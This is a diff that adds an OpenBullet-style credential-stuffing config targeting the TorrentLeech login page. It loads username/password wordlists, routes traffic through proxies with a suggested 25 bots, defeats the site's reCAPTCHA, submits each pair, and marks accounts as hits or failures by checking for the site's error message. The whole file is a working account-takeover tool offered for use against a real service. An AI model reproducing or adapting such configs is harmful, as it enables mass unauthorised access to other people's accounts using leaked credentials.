@@ -1,0 +1,40 @@
+[SETTINGS]
+{
+  "Name": "TorrentLeech",
+  "SuggestedBots": 25,
+  "LastModified": "2018-06-19T18:23:56.5798006+00:00",
+  "AdditionalInfo": "",
+  "Author": "SubAtomic",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+RECAPTCHA "https://www.torrentleech.org/user/account/login/" "6LejTzUUAAAAAFHWFFQunJ5V1aTqeR03OPM01gin" -> VAR "RECAP" 
+REQUEST POST "https://www.torrentleech.org/user/account/login/" AutoRedirect=TRUE 
+  CONTENT "username=<USER>&password=<PASS>&g-recaptcha-response=<RECAP>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://www.torrentleech.org/user/account/login/" 
+  HEADER "origin: https://www.torrentleech.org" 
+  HEADER "upgrade-insecure-requests: 1" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY " Invalid Username/password combination!" 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" DoesNotContain " Invalid Username/password combination!" 
